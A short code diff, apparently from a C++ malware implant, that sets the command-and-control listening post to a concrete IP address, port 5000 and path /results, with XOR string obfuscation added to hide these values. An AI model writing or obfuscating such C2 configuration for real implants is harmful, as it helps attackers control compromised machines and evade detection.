@@ -6,7 +6,7 @@
 int main()
 {
     //Specify listening post endpoint configuration
-    const auto host = XOR_STR("ENTER C2 IP ADDR"); // added basic xor obfuscation, just in case
+    const auto host = XOR_STR("172.26.246.125"); // added basic xor obfuscation, just in case
     const auto port = XOR_STR("5000");
     const auto uri = XOR_STR("/results");
 
